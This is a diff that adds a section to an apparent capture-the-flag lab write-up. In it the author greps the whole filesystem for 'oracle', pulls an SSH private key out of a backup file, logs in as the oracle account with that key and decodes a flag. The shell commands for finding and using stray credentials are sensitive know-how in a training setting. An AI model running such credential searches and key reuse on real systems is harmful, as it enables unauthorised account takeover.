@@ -129,3 +129,33 @@ mysql>
 We got that flag! `FLAG-55548fdb24a6ef248d8fdfde2720f6bd`
 
 ## SysAdmin Part 4
+
+![](https://i.imgur.com/VzGrXtu.png)
+
+Now we have to go back as `morpheus` & get access to oracle account. If we use the `grep` command we can see in the end a "backup" file:
+
+```
+morpheus@lxc-sysadmin:~$ grep -Ri "oracle" / 2>/dev/null
+..data..
+Binary file /backup/c074fa6ec17bb35e168366c43cf4cd19 matches
+```
+
+There is a SSH private key in it, let's save it into a file and login as oracle:
+
+```
+morpheus@lxc-sysadmin:/tmp$ touch key
+morpheus@lxc-sysadmin:/tmp$ nano key
+morpheus@lxc-sysadmin:/tmp$ chmod 600 key
+morpheus@lxc-sysadmin:/tmp$ ssh -i key oracle@127.0.0.1
+
+oracle@lxc-sysadmin:~$
+```
+
+We got the flag! 
+
+```
+oracle@lxc-sysadmin:~$ base64 -d flag.txt
+FLAG-d325e738fa7d87d4f5607c302b37db20oracle
+```
+
+## SysAdmin Part 5
